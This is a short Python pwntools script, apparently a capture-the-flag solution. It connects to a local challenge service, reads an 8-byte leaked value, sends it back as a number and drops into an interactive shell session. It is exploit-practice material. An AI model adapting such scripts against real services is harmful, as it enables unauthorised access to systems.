```python
from pwn import *
context(arch='amd64', os='linux', log_level='debug')
p = remote('127.0.0.1', 12311)
p.recvuntil('hint.')
leak = p.recv(8)
output = u64(leak)
log.debug(output)
p.sendline(str(output).encode())
print(str(output).encode())
p.interactive()
```